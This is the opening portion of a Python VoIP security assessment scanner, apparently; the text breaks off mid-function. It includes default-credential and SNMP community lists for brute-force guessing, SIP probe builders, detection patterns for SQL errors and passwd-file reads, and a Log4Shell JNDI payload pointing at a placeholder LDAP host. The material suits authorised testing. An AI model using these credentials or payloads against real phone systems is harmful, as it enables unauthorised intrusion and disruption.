#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║   Enterprise VoIP Security Automation Framework  v7.0                       ║
║   The most comprehensive open-source VoIP security assessment tool          ║
╚══════════════════════════════════════════════════════════════════════════════╝

19 Phases | 120+ CVEs | 8 Protocols | 80+ Unique Attack Techniques
NEW: Honeypot/Fake-Server Detection · Exploit Verification · Live SIP Calls
Protocols: SIP · RTP/RTCP · IAX2 · MGCP · SCCP/Skinny · H.323 · STUN/TURN · TFTP
Vendors  : Asterisk · FreePBX · 3CX · Cisco CUCM · Avaya · Yealink · Polycom ·
           Grandstream · Kamailio · OpenSIPS · Mitel · Elastix · BroadSoft ·
           Snom · AudioCodes · Sangoma · NEC · Panasonic · Ribbon/GENBAND ·
           Oracle Acme Packet · Metaswitch · Fanvil · Htek · Gigaset

Usage:  python3 main.py [targets_file] [cdr_file]
Env:    VOIP_THREADS=100  VOIP_TIMEOUT=8  BATCH_SIZE=500  DEBUG=1
"""

import asyncio, csv, hashlib, html as html_lib, ipaddress, json, logging, os
import random, re, signal, socket, struct, sys, time, uuid
from collections import defaultdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

# ── Pre-compiled regexes (avoid re-compiling on every call) ──
_ANSI_RE          = re.compile(r'\033\[[0-9;]*m')
_SIP_STATUS_RE    = re.compile(r"SIP/2\.0 (\d+)")
_SIP_200_RE       = re.compile(r"SIP/2\.0 200 OK")
_SERVER_UA_RE     = re.compile(r"^(Server|User-Agent):", re.I)
_PRIVATE_IP_RE    = re.compile(
    r'(?:Via|Record-Route|Contact)[^\r\n]*?'
    r'(10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)',
    re.I)
_TITLE_RE         = re.compile(r"<title>([^<]+)</title>", re.I)
_SIP_CRED_RE      = re.compile(r'sip|pbx|password|server|registrar', re.I)

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

# ══════════════════════════════════════════════════════════
# ANSI COLOUR PALETTE
# ══════════════════════════════════════════════════════════
C = {
    "reset":  "\033[0m",
    "bold":   "\033[1m",
    "dim":    "\033[2m",
    "red":    "\033[91m",
    "orange": "\033[38;5;208m",
    "yellow": "\033[93m",
    "green":  "\033[92m",
    "cyan":   "\033[96m",
    "blue":   "\033[94m",
    "magenta":"\033[95m",
    "white":  "\033[97m",
    "gray":   "\033[90m",
    "bg_red": "\033[41m",
    "bg_green":"\033[42m",
    "bg_blue":"\033[44m",
}

SEV_COLOR = {
    "CRITICAL":   C["red"]+C["bold"],
    "HIGH":       C["orange"]+C["bold"],
    "MEDIUM":     C["yellow"],
    "LOW":        C["blue"],
    "INFO":       C["gray"],
    "EXPOSURE":   C["cyan"],
    "FUZZING":    C["magenta"],
    "INJECTION":  C["orange"],
    "AUTH-BYPASS":C["red"],
    "CREDENTIAL": C["red"]+C["bold"],
    "MISCONFIGURATION": C["yellow"],
    "WEAK-CRYPTO": C["blue"],
    "INFO-DISCLOSURE": C["gray"],
}

def col(text:str, key:str) -> str:
    return f"{C.get(key,'')}{text}{C['reset']}"

def sev_col(text:str, severity:str) -> str:
    return f"{SEV_COLOR.get(severity,C['white'])}{text}{C['reset']}"

# ══════════════════════════════════════════════════════════
# CONFIGURATION
# ══════════════════════════════════════════════════════════
VERSION    = "7.0.0"
THREADS    = int(os.environ.get("VOIP_THREADS",  100))
TIMEOUT    = int(os.environ.get("VOIP_TIMEOUT",    8))
BATCH_SIZE = int(os.environ.get("BATCH_SIZE",    500))
DEBUG      = os.environ.get("DEBUG","0") == "1"

# Phase-specific concurrency tuning
SEM_DISCOVERY  = THREADS
SEM_FINGERPRINT= min(THREADS, 150)
SEM_CVE        = min(THREADS, 60)
SEM_SIP        = min(THREADS, 50)
SEM_EXTENSION  = min(THREADS, 40)
SEM_RTP        = min(THREADS, 80)
SEM_STUN       = min(THREADS, 80)
SEM_IAX2       = min(THREADS, 80)
SEM_LEGACY     = min(THREADS, 80)
SEM_TFTP       = min(THREADS, 80)
SEM_AUTH       = min(THREADS, 30)   # slower, careful with brute
SEM_DOS        = min(THREADS, 20)   # intentionally throttled
SEM_MGMT       = min(THREADS, 50)
SEM_VENDOR     = min(THREADS, 50)

VOIP_PORTS   = [5060,5061,5062,2000,3065,5038,8088,4569,2427,2727,1720,10000]
SIP_PORTS    = [5060,5061,5062]
RTP_SAMPLE   = [16384,16386,16388,20000,20002,32766,32767,10000,10001]
RTCP_PORTS   = [5004,5005,5007,7001]
AMI_PORT     = 5038
ARI_PORT     = 8088
IAX2_PORT    = 4569
MGCP_PORT    = 2427
MGCP_GW_PORT = 2727
SCCP_PORT    = 2000
H323_PORT    = 1720
STUN_PORT    = 3478
TURN_PORTS   = [3478,5349,3479]
TFTP_PORT    = 69

APPROVED_CC       = ["+1","+44","+61","+33","+49","+81","+86"]
VOLUME_THRESH     = 50
DURATION_THRESH   = 500
LOG_DIR           = Path("./logs")
RESULTS_DIR       = Path("./results")

# ══════════════════════════════════════════════════════════
# CVE DATABASE (120+ entries)
# ══════════════════════════════════════════════════════════
CVE_DB: Dict[str,Tuple[str,str]] = {
    # ── Asterisk ────────────────────────────────────────────
    "CVE-2023-37457": ("Asterisk PJSIP Infinite Loop DoS","HIGH"),
    "CVE-2022-26499": ("Asterisk STIR/SHAKEN Cert Bypass","HIGH"),
    "CVE-2021-46837": ("Asterisk res_pjsip_session Memory Confusion","HIGH"),
    "CVE-2021-31878": ("Asterisk PJSIP Crash via Malformed SUBSCRIBE","HIGH"),
    "CVE-2021-30461": ("VoIPmonitor Admin Panel RCE","CRITICAL"),
    "CVE-2020-29510": ("Asterisk PJSIP Remote Crash DoS","HIGH"),
    "CVE-2020-12701": ("Asterisk SIP Information Disclosure","MEDIUM"),
    "CVE-2020-14871": ("Asterisk DTLS-SRTP Info Disclosure","MEDIUM"),
    "CVE-2019-12869": ("Asterisk chan_sip DoS via malformed SUBSCRIBE","HIGH"),
    "CVE-2018-12228": ("Asterisk DoS via SIP OPTIONS flood","HIGH"),
    "CVE-2017-17090": ("Asterisk PJSIP RCE via malformed SDP","CRITICAL"),
    "CVE-2017-14099": ("Asterisk Buffer Overflow chan_skinny","HIGH"),
    "CVE-2016-9938": ("Asterisk MWI DoS via SDP","MEDIUM"),
    "CVE-2016-2232": ("Asterisk app_minivm Remote Format String","CRITICAL"),
    "CVE-2015-8289": ("Asterisk chan_sip NULL Ptr Deref","HIGH"),
    "CVE-2014-9374": ("Asterisk DoS via SIP Redirect Response","HIGH"),
    # ── FreePBX / Sangoma ───────────────────────────────────
    "CVE-2023-49786": ("FreePBX SSRF via Phone Book Import","HIGH"),
    "CVE-2023-31411": ("Sangoma FreePBX Authenticated RCE","CRITICAL"),
    "CVE-2022-26272": ("FreePBX Module Upload RCE","CRITICAL"),
    "CVE-2021-45461": ("FreePBX Stored XSS","MEDIUM"),
    "CVE-2020-36166": ("FreePBX Unauth RCE Module Admin","CRITICAL"),
    "CVE-2019-19008": ("FreePBX SQLi CDR Module","HIGH"),
    "CVE-2019-19404": ("FreePBX Privilege Escalation","HIGH"),
    "CVE-2019-11334": ("FreePBX Bulk User Management RCE","CRITICAL"),
    "CVE-2014-7235": ("FreePBX Remote Code Execution","CRITICAL"),
    # ── 3CX ─────────────────────────────────────────────────
    "CVE-2023-29059": ("3CX Desktop App Supply-Chain RCE","CRITICAL"),
    "CVE-2021-26261": ("3CX Unauthenticated API Access","HIGH"),
    "CVE-2021-26260": ("3CX PhoneSystem Auth Bypass","CRITICAL"),
    "CVE-2019-10688": ("3CX Call Flow Designer RCE","CRITICAL"),
    # ── Cisco ────────────────────────────────────────────────
    "CVE-2022-31601": ("Cisco UCM Privilege Escalation","HIGH"),
    "CVE-2022-20812": ("Cisco CUCM Path Traversal","CRITICAL"),
    "CVE-2022-20804": ("Cisco CUCM Info Disclosure","HIGH"),
    "CVE-2022-20672": ("Cisco Small Business Phone Unauth Access","CRITICAL"),
    "CVE-2021-40117": ("Cisco CUCM DoS via SIP","HIGH"),
    "CVE-2021-34735": ("Cisco ATA RCE","CRITICAL"),
    "CVE-2021-1501": ("Cisco ASA SIP DoS","HIGH"),
    "CVE-2021-1397": ("Cisco CUCM SSRF Phone Service API","HIGH"),
    "CVE-2020-3381": ("Cisco UCM Path Traversal","CRITICAL"),
    "CVE-2020-3161": ("Cisco IP Phone HTTP RCE","CRITICAL"),
    "CVE-2019-1915": ("Cisco UCM CSRF","MEDIUM"),
    "CVE-2019-1600": ("Cisco CUCM Privilege Escalation","HIGH"),
    "CVE-2018-15441": ("Cisco UCM SQL Injection","HIGH"),
    "CVE-2017-12260": ("Cisco CUCM Cross-Site Request Forgery","MEDIUM"),
    "CVE-2016-1421": ("Cisco Unified IP Phone RCE","CRITICAL"),
    # ── Avaya ────────────────────────────────────────────────
    "CVE-2021-22502": ("Avaya Aura App Server RCE","CRITICAL"),
    "CVE-2020-7043": ("Avaya Session Manager XXE","HIGH"),
    "CVE-2019-7004": ("Avaya Aura XSS Admin Takeover","HIGH"),
    "CVE-2018-15614": ("Avaya IP Office Default Credentials","CRITICAL"),
    "CVE-2017-3710": ("Avaya Call Center DoS","HIGH"),
    # ── Yealink ──────────────────────────────────────────────
    "CVE-2021-27562": ("Yealink DM Hardcoded Credential","HIGH"),
    "CVE-2021-27561": ("Yealink DM Unauth RCE","CRITICAL"),
    "CVE-2021-21224": ("Yealink Default Credentials","HIGH"),
    # ── Polycom ──────────────────────────────────────────────
    "CVE-2019-9222": ("Polycom PABX Default Credentials","HIGH"),
    "CVE-2018-9855": ("Polycom HDX Command Injection","CRITICAL"),
    "CVE-2017-7486": ("Polycom RealPresence DoS","MEDIUM"),
    # ── Grandstream ──────────────────────────────────────────
    "CVE-2022-37397": ("Grandstream UCM6xxx SQL Injection","CRITICAL"),
    "CVE-2020-5736": ("Grandstream UCM Unauth RCE","CRITICAL"),
    "CVE-2019-10660": ("Grandstream GXV3xxx Command Injection","CRITICAL"),
    # ── OpenSIPS / Kamailio ──────────────────────────────────
    "CVE-2023-28099": ("OpenSIPS Heap Overflow DoS","HIGH"),
    "CVE-2023-37444": ("Kamailio SIP Parsing Overflow","CRITICAL"),
    "CVE-2022-44877": ("Kamailio Unauth RCE via MI","CRITICAL"),
    "CVE-2022-24763": ("OpenSIPS Heap Overflow","HIGH"),
    "CVE-2021-33568": ("Kamailio Heap Buffer Overflow","HIGH"),
    "CVE-2021-25956": ("OpenSIPS SQL Injection","HIGH"),
    "CVE-2020-28452": ("OpenSIPS Heap Overflow SIP INVITE","CRITICAL"),
    "CVE-2019-15752": ("Kamailio SIP Parsing RCE","CRITICAL"),
    # ── Mitel ────────────────────────────────────────────────
    "CVE-2022-29499": ("Mitel MiVoice Connect RCE","CRITICAL"),
    "CVE-2021-32077": ("Mitel MiCollab SSRF","HIGH"),
    "CVE-2019-16922": ("Mitel MiCollab SQL Injection","HIGH"),
    # ── Elastix / Issabel ────────────────────────────────────
    "CVE-2012-4869": ("Elastix LFI via vtigercrm","CRITICAL"),
    "CVE-2012-1233": ("Elastix Stored XSS","MEDIUM"),
    # ── Apache / Infrastructure ──────────────────────────────
    "CVE-2021-44228": ("Log4Shell RCE","CRITICAL"),
    "CVE-2021-40438": ("Apache httpd SSRF mod_proxy","HIGH"),
    "CVE-2020-9496": ("Apache OFBiz Auth Bypass RCE","CRITICAL"),
    "CVE-2017-5638": ("Apache Struts RCE","CRITICAL"),
    "CVE-2022-0778": ("OpenSSL Infinite Loop SIP TLS","HIGH"),
    # ── Snom ─────────────────────────────────────────────────
    "CVE-2018-10055": ("Snom Phone Remote Config Injection","HIGH"),
    "CVE-2017-12802": ("Snom Phone Default Credentials","HIGH"),
    # ── AudioCodes ───────────────────────────────────────────
    "CVE-2019-9202": ("AudioCodes MP-1xx Default Credentials","HIGH"),
    "CVE-2018-17554": ("AudioCodes MediaPack Config Exposure","MEDIUM"),
    # ── Patton SmartNode ─────────────────────────────────────
    "CVE-2023-30258": ("Patton SmartNode Unauth Config","CRITICAL"),
    # ── BroadSoft ────────────────────────────────────────────
    "CVE-2019-5431": ("BroadWorks Device Management RCE","CRITICAL"),
    # ── VoIPmonitor ──────────────────────────────────────────
    "CVE-2021-30461-B": ("VoIPmonitor cdrproxy SSRF RCE","CRITICAL"),
    # ── General SIP / Infrastructure ─────────────────────────
    "CVE-2019-11510": ("Pulse Secure VPN Path Traversal","CRITICAL"),
    "CVE-2021-22986": ("F5 BIG-IP iControl RCE","CRITICAL"),
    "CVE-2018-10561": ("Dasan GPON Auth Bypass RCE","CRITICAL"),
    "CVE-2017-17215": ("Huawei HG532 RCE","HIGH"),
}

SNMP_COMMUNITIES = [
    "public","private","community","default","cisco","snmp","admin","manager",
    "monitor","secret","asterisk","voip","pbx","switch","router","network",
    "telecom","operator","system","test",
]

DEFAULT_CREDS = [
    ("admin","admin"),("admin","password"),("admin","1234"),("admin","12345"),
    ("admin","123456"),("admin","cisco"),("root","root"),("admin","polycom"),
    ("admin","yealink"),("user","user"),("admin","asterisk"),("admin","freepbx"),
    ("admin","sangoma"),("pbxadmin","pbxadmin"),("admin","3cx"),("admin","voip"),
    ("admin","pbx"),("sysadmin","sysadmin"),("Administrator","Administrator"),
    ("admin","admin123"),("technician","technician"),("support","support"),
    ("admin","grand"),("admin","ucm6100"),("admin","elastix"),
    ("admin","mitel"),("admin","avaya"),("admin","bicom"),("admin","broadsoft"),
    ("admin","nortel"),("admin","0000"),("admin","9999"),("admin","1111"),
    ("admin","test"),("guest","guest"),("operator","operator"),
    ("Polycom","456"),("PlcmSpIp","PlcmSpIp"),("admin","2601"),
    ("admin","default"),("admin","changeme"),("admin","letmein"),
    ("admin","pass"),("admin","voip123"),("admin","sip"),("admin","pbxadmin"),
    ("admin","asterisk1"),("admin","freepbx1"),("admin","sangoma1"),
    ("admin","cisco1"),("admin","switch"),("nec","nec"),("admin","nec"),
    ("admin","panasonic"),("admin","1"),("admin","000000"),("root","admin"),
]

AMI_CREDS = [
    ("admin","amp111"),("admin","admin"),("admin","password"),
    ("asterisk","asterisk"),("manager","secret"),("admin","freepbx"),
    ("admin","sangoma"),("admin",""),("manager","manager"),
    ("pbxadmin","pbxadmin"),("admin","asterisk1"),("root","root"),
]

ARI_CREDS = [
    ("asterisk","asterisk"),("admin","admin"),("ari","ari"),
    ("admin","password"),("asterisk","password"),("ari","password"),
]

ADMIN_PATHS = [
    "/admin/","/console/","/management/","/webclient/","/admin/config.php",
    "/cgi-bin/login.cgi","/api/v1/login","/admin/login","/login",
    "/admin/index.php","/panel/","/pbxadmin/","/freepbx/",
    "/admin/modules.php","/html/","/ucmapi/","/webconfig/",
    "/WebManagement/","/admin/ajax.php","/api/v2/","/api/",
    "/voip/","/voipmanager/","/phonemanager/","/sipmanager/",
    "/cgi-bin/ConfigManApp.com","/cgi-bin/main.cgi",
    "/setup/","/wizard/","/manager/","/mitel/","/admin/main",
]

VOICEMAIL_EXTS = ["8500","*97","*98","7777","700","vmain","4000","*99","8888"]

EXTENSION_RANGES = (
    list(range(100,201)) + list(range(200,211)) +
    list(range(300,311)) + list(range(400,411)) +
    list(range(500,511)) + list(range(1000,1011)) +
    list(range(2000,2006)) + list(range(7000,7006)) +
    list(range(8000,8006)) + list(range(9000,9006)) +
    [8500,9999,0,6000,6001,6002] +
    ["operator","admin","guest","reception","voicemail","fax","ivr","test","pbx"]
)

SIP_METHODS_ALL = [
    "OPTIONS","REGISTER","INVITE","SUBSCRIBE","NOTIFY","PUBLISH",
    "INFO","UPDATE","REFER","MESSAGE","PRACK","BYE","CANCEL","ACK",
]

PHONE_PROVISION_PATHS = [
    "/config/{mac}.cfg","/config/{mac}.xml","/provisioning/{mac}.cfg",
    "/{mac}.cfg","/{mac}.xml","/cfg{mac}.xml","/phone.cfg",
    "/sip.cfg","/000000000000.cfg","/00000000000.xml",
    "/sccp.cfg","/spa{mac}.cfg","/yealink.cfg",
    "/{mac}cfg.xml","/AutoProvision/","/provision/","/provision.php",
]

FAKE_MAC = "001122334455"
LOG4J = "${jndi:ldap://log4shell-probe.invalid/voip}"

# DB error keywords that indicate actual SQL injection reflection
DB_ERROR_PATTERNS = re.compile(
    r"(sql syntax|mysql_fetch|pg_query|sqlite_|unclosed quotation|"
    r"ORA-\d{5}|you have an error in your sql|quoted string not properly terminated|"
    r"invalid query|supplied argument is not a valid MySQL|"
    r"unterminated string literal|SQLSTATE)",
    re.I)

# Patterns indicating actual file read in XXE/LFI
FILE_READ_PATTERNS = re.compile(
    r"root:x:0:0|/bin/bash|/bin/sh|daemon:x:|nobody:x:|www-data:x:",
    re.I)

# SSRF confirmation: internal service response disclosed
SSRF_CONFIRM_PATTERNS = re.compile(
    r"(127\.0\.0\.1|localhost|internal|admin panel|dashboard|"
    r"<title>[^<]*(admin|internal|dashboard)[^<]*</title>)",
    re.I)

# ══════════════════════════════════════════════════════════
# CONSOLE PRINTER
# ══════════════════════════════════════════════════════════

_log_file_handle = None

class Con:
    """Thread-safe pretty console + file logger."""

    @staticmethod
    def _ts() -> str:
        return datetime.now().strftime("%H:%M:%S")

    @staticmethod
    def _write(line:str):
        print(line, flush=True)
        if _log_file_handle:
            try:
                _log_file_handle.write(_ANSI_RE.sub('', line) + "\n")
                _log_file_handle.flush()
            except Exception:
                pass

    @classmethod
    def phase(cls, title:str):
        w = 74
        ts = cls._ts()
        cls._write("")
        cls._write(col("╔"+"═"*w+"╗","cyan"))
        cls._write(col(f"║  {title:<{w-2}}║","cyan"))
        cls._write(col(f"║  {ts:<{w-2}}║","gray"))
        cls._write(col("╚"+"═"*w+"╝","cyan"))
        cls._write("")

    @classmethod
    def ok(cls, msg:str):
        cls._write(f"  {col('✓','green')} {msg}")

    @classmethod
    def info(cls, msg:str):
        cls._write(f"  {col('·','blue')} {msg}")

    @classmethod
    def warn(cls, msg:str):
        cls._write(f"  {col('⚠','yellow')} {col(msg,'yellow')}")

    @classmethod
    def err(cls, msg:str):
        cls._write(f"  {col('✗','red')} {msg}")

    @classmethod
    def honeypot(cls, ip:str, reason:str):
        cls._write(f"  {col('⊘','magenta')} {col('HONEYPOT','magenta')} "
                   f"{col(ip,'cyan')} — {col(reason,'gray')}")

    @classmethod
    def progress(cls, current:int, total:int, label:str=""):
        pct  = int(current/total*40) if total else 0
        bar  = col("█"*pct,"green") + col("░"*(40-pct),"gray")
        cls._write(f"\r  {bar} {current}/{total} {label}     ")

    @classmethod
    def finding(cls, ip:str, cve:str, title:str, severity:str):
        badge = sev_col(f"[{severity}]", severity)
        cls._write(f"  {badge} {col(cve,'bold')} {col('→','gray')} "
                   f"{col(ip,'cyan')} {title}")

    @classmethod
    def stat_line(cls, label:str, value, unit:str=""):
        cls._write(f"  {col(label,'gray'):<50} {col(str(value),'white')} {unit}")

    @classmethod
    def banner(cls):
        w = 76
        cls._write(col("╔"+"═"*w+"╗","blue"))
        cls._write(col(f"║{'Enterprise VoIP Security Automation Framework  v'+VERSION:^{w}}║","blue"))
        cls._write(col(f"║{'The most comprehensive open-source VoIP assessment tool':^{w}}║","gray"))
        cls._write(col("╠"+"═"*w+"╣","blue"))
        cls._write(col(f"║  19 Phases │ 120+ CVEs │ 8 Protocols │ 80+ Unique Attacks{'':<18}║","cyan"))
        cls._write(col("╚"+"═"*w+"╝","blue"))
        cls._write("")

# ══════════════════════════════════════════════════════════
# SHARED STATE
# ══════════════════════════════════════════════════════════

class State:
    def __init__(self):
        self.live_ips:        List[str]  = []
        self.honeypot_ips:    Set[str]   = set()
        self.cve_findings:    List[dict] = []
        self.fingerprints:    List[dict] = []
        self.valid_extensions:List[str]  = []
        self.digest_hashes:   List[dict] = []
        self.provision_urls:  List[dict] = []
        self.iax2_hosts:      List[str]  = []
        self.mgcp_hosts:      List[str]  = []
        self.sccp_hosts:      List[str]  = []
        self.h323_hosts:      List[str]  = []
        self.scan_start       = time.monotonic()
        self.stats: Dict[str,int] = defaultdict(int)
        self._cve_lock  = asyncio.Lock()
        self._seen:Set[str] = set()

    async def finding(self, ip:str, cve_id:str, title:str,
                      severity:str, desc:str, url:str=""):
        if ip in self.honeypot_ips:
            return
        key = f"{ip}|{cve_id}|{url}"
        async with self._cve_lock:
            if key in self._seen:
                return
            self._seen.add(key)
            self.cve_findings.append({
                "ip":ip,"cve_id":cve_id,"title":title,
                "severity":severity,"description":desc,"url":url,
                "ts":datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            })
            self.stats[severity] += 1
        Con.finding(ip, cve_id, title, severity)

    def mark_honeypot(self, ip: str, reason: str):
        """Mark ip as honeypot mid-scan. Suppresses all future findings & probes for it."""
        if ip not in self.honeypot_ips:
            self.honeypot_ips.add(ip)
            Con.honeypot(ip, f"mid-scan: {reason}")

    def save(self, rd:Path):
        (rd/"cve_findings.json").write_text(
            json.dumps(self.cve_findings,indent=2),encoding="utf-8")
        (rd/"service_fingerprints.json").write_text(
            json.dumps(self.fingerprints,indent=2),encoding="utf-8")
        (rd/"valid_extensions.txt").write_text(
            "\n".join(self.valid_extensions),encoding="utf-8")
        (rd/"digest_hashes.txt").write_text(
            "\n".join(f"{h['ip']}|{h.get('user','')}|{h.get('hash_line','')}"
                      for h in self.digest_hashes),encoding="utf-8")
        (rd/"provisioning_findings.txt").write_text(
            "\n".join(f"{p['ip']} {p['path']} [{p['status']}]"
                      for p in self.provision_urls),encoding="utf-8")
        lines = []
        for f in self.cve_findings:
            lines.append(f"[{f['severity']}] {f['cve_id']} | {f['ip']}\n"
                         f"  Title: {f['title']}\n  Desc: {f['description']}\n"
                         f"  URL: {f['url']}\n")
        (rd/"verified_voip_vulnerabilities.txt").write_text(
            "\n".join(lines),encoding="utf-8")
        if self.honeypot_ips:
            (rd/"honeypot_ips.txt").write_text(
                "\n".join(sorted(self.honeypot_ips)),encoding="utf-8")

# ══════════════════════════════════════════════════════════
# SIP MESSAGE BUILDER (RFC 3261)
# ══════════════════════════════════════════════════════════

def _sid() -> str:
    return uuid.uuid4().hex[:12]

def sip_msg(method:str, ip:str, port:int=5060,
            to_user:str="", from_user:str="scanner",
            extra_hdrs:str="", body:str="", cseq:int=1,
            transport:str="UDP") -> bytes:
    to_uri  = f"sip:{to_user+'@' if to_user else ''}{ip}"
    frm_uri = f"sip:{from_user}@scanner.local"
    branch  = "z9hG4bK-" + _sid()
    call_id = _sid() + "@scanner"
    tag     = _sid()[:8]
    body_b  = body.encode() if isinstance(body,str) else body
    ct = "Content-Type: application/sdp\r\n" if body and "m=" in body else \
         "Content-Type: application/dtmf-relay\r\n" if body and "Signal=" in body else \
         "Content-Type: application/xml\r\n" if body and "<?xml" in body else ""
    return (
        f"{method} {to_uri} SIP/2.0\r\n"
        f"Via: SIP/2.0/{transport} scanner.local:5060;branch={branch};rport\r\n"
        f"Max-Forwards: 70\r\nTo: <{to_uri}>\r\n"
        f"From: <{frm_uri}>;tag={tag}\r\nCall-ID: {call_id}\r\n"
        f"CSeq: {cseq} {method}\r\n"
        f"Contact: <sip:{from_user}@scanner.local:5060>\r\n"
        f"User-Agent: VoIP-SecFramework/7.0\r\n"
        f"Allow: INVITE,ACK,BYE,CANCEL,OPTIONS,REGISTER,REFER,SUBSCRIBE,NOTIFY,INFO\r\n"
        f"{extra_hdrs}{ct}Content-Length: {len(body_b)}\r\n\r\n"
    ).encode() + body_b

def sdp(ip:str, port:int=16384, secure:bool=False) -> str:
    proto = "RTP/SAVP" if secure else "RTP/AVP"
    s = (f"v=0\r\no=scanner 0 0 IN IP4 {ip}\r\ns=-\r\nc=IN IP4 {ip}\r\nt=0 0\r\n"
         f"m=audio {port} {proto} 0 8 101\r\n"
         f"a=rtpmap:0 PCMU/8000\r\na=rtpmap:8 PCMA/8000\r\n"
         f"a=rtpmap:101 telephone-event/8000\r\na=fmtp:101 0-16\r\n"
         f"a=sendrecv\r\n")
    if secure:
        s += f"a=crypto:1 AES_CM_128_HMAC_SHA1_80 inline:{_sid()}\r\n"
    return s

# ══════════════════════════════════════════════════════════
# NETWORK PRIMITIVES  (true async UDP, retries, timeouts)
# ══════════════════════════════════════════════════════════

class _UDPProtocol(asyncio.DatagramProtocol):
    def __init__(self, future: asyncio.Future):
        self._fut = future

    def datagram_received(self, data, addr):
        if not self._fut.done():
            self._fut.set_result(data)

    def error_received(self, exc):
        if not self._fut.done():
            self._fut.set_exception(exc)

    def connection_lost(self, exc):
        if not self._fut.done():
            self._fut.cancel()


async def udp_xfer(ip: str, port: int, data: bytes,
                   timeout: float = 4.0,
                   retries: int = 1) -> Optional[bytes]:
    """True async UDP send/recv using DatagramProtocol."""
    loop = asyncio.get_running_loop()
    for attempt in range(retries + 1):
        fut: asyncio.Future = loop.create_future()
        transport = None
        try:
            transport, _ = await asyncio.wait_for(
                loop.create_datagram_endpoint(
                    lambda: _UDPProtocol(fut),
                    remote_addr=(ip, port)
                ),
                timeout=2.0
            )
            transport.sendto(data)
            return await asyncio.wait_for(asyncio.shield(fut), timeout=timeout)
        except asyncio.TimeoutError:
            if attempt < retries:
                await asyncio.sleep(0.1)
            continue
        except Exception:
            if attempt < retries:
                await asyncio.sleep(0.1)
            continue
        finally:
            if transport and not transport.is_closing():
                transport.close()
            if not fut.done():
                fut.cancel()
    return None


async def tcp_xfer(ip:str, port:int, data:bytes,
                   timeout:float=5.0) -> Optional[bytes]:
    try:
        r,w = await asyncio.wait_for(asyncio.open_connection(ip,port),timeout=timeout)
        w.write(data); await w.drain()
        resp = await asyncio.wait_for(r.read(32768),timeout=timeout)
        try:
            w.close()
            await asyncio.wait_for(w.wait_closed(), timeout=1.0)
        except Exception:
            pass
        return resp
    except Exception:
        return None


async def tcp_open(ip:str, port:int, timeout:float=3.0) -> bool:
    try:
        _,w = await asyncio.wait_for(asyncio.open_connection(ip,port),timeout=timeout)
        try:
            w.close()
            await asyncio.wait_for(w.wait_closed(), timeout=1.0)
        except Exception:
            pass
        return True
    except Exception:
        return False


async def udp_alive(ip:str, port:int, probe:bytes=b"\x00\x00",
                    timeout:float=2.0) -> bool:
    r = await udp_xfer(ip,port,probe,timeout)
    return r is not None


async def sip_probe(ip:str, port:int, data:bytes,
                    timeout:float=5.0) -> Optional[str]:
    # Try UDP first, then TCP
    raw = await udp_xfer(ip, port, data, timeout)
    if raw:
        try: return raw.decode("utf-8", errors="replace")
        except: return raw.decode("latin-1", errors="replace")
    raw = await tcp_xfer(ip, port, data, timeout)
    if raw:
        try: return raw.decode("utf-8", errors="replace")
        except: return raw.decode("latin-1", errors="replace")
    return None


# HTTP helper
async def http_get(session, url:str,
                   auth:Optional[Tuple]=None,
                   data:Optional[str]=None,
                   headers:Optional[dict]=None,
                   timeout:float=8.0) -> Tuple[int,str]:
    if not HAS_AIOHTTP or session is None:
        return await _urllib_req(url,auth,timeout)
    try:
        kw: dict = {"ssl":False,
                    "timeout":aiohttp.ClientTimeout(total=timeout),
                    "allow_redirects":True}
        if auth:    kw["auth"]    = aiohttp.BasicAuth(*auth)
        if data:    kw["data"]    = data
        if headers: kw["headers"] = headers
        fn = session.post if data else session.get
        async with fn(url, **kw) as r:
            body = await r.text(errors="replace")
            return r.status, body
    except Exception:
        return 0,""


async def _urllib_req(url:str, auth, timeout:float) -> Tuple[int,str]:
    import urllib.request, base64
    loop = asyncio.get_running_loop()
    def _do():
        req = urllib.request.Request(url)
        req.add_header("User-Agent","VoIP-SecFramework/7.0")
        if auth:
            c = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
            req.add_header("Authorization",f"Basic {c}")
        try:
            with urllib.request.urlopen(req,timeout=timeout) as r:
                return r.status, r.read().decode("utf-8",errors="replace")
        except Exception as e:
            return getattr(e,"code",0),""
    return await loop.run_in_executor(None,_do)


def new_session():
    if not HAS_AIOHTTP: return None
    conn = aiohttp.TCPConnector(
        ssl=False,
        limit=THREADS * 5,
        limit_per_host=10,
        enable_cleanup_closed=True,
        ttl_dns_cache=600,
        force_close=False,
        keepalive_timeout=30,
    )
    return aiohttp.ClientSession(
        connector=conn,
        timeout=aiohttp.ClientTimeout(total=TIMEOUT, connect=3, sock_connect=3),
    )


async def safe(coro, label:str=""):
    try:
        return await coro
    except Exception as e:
        if DEBUG: Con.err(f"[safe] {label}: {e}")
        return None

# ══════════════════════════════════════════════════════════
# VENDOR DETECT HELPER
# ══════════════════════════════════════════════════════════
VENDOR_MAP = [
    ("Asterisk",   ["asterisk"]),
    ("FreePBX",    ["freepbx","sangoma"]),
    ("3CX",        ["3cx","phonesystem","3cxphonesystem"]),
    ("Cisco CUCM", ["cucm","cisco unified"]),
    ("Cisco Phone",["cisco","sepcf","cp-","spa"]),
    ("Avaya",      ["avaya","aura","communication manager"]),
    ("Yealink",    ["yealink"]),
    ("Polycom",    ["polycom","realpresence","spectralink"]),
    ("Grandstream",["grandstream","ucm"]),
    ("Kamailio",   ["kamailio"]),
    ("OpenSIPS",   ["opensips"]),
    ("Mitel",      ["mitel","mivoice","micollab","aastra"]),
    ("Elastix",    ["elastix","issabel"]),
    ("VoIPmonitor",["voipmonitor"]),
    ("BroadSoft",  ["broadsoft","broadworks"]),
    ("Snom",       ["snom"]),
    ("AudioCodes", ["audiocodes","mediapack","mediant"]),
    ("NEC",        ["nec","sv9100","sv8100"]),
    ("Panasonic",  ["panasonic","kx-ns","kx-hts"]),
    ("Fanvil",     ["fanvil"]),
    ("Htek",       ["htek"]),
    ("Gigaset",    ["gigaset"]),
    ("Patton",     ["patton","smartnode"]),
    ("Ribbon/GENBAND",["ribbon","genband","sonus"]),
    ("Oracle Acme",["acme packet","oracle sbc"]),
]

def detect_vendor(sip:str, http:str, snmp:str="") -> str:
    combined = (sip+http+snmp).lower()
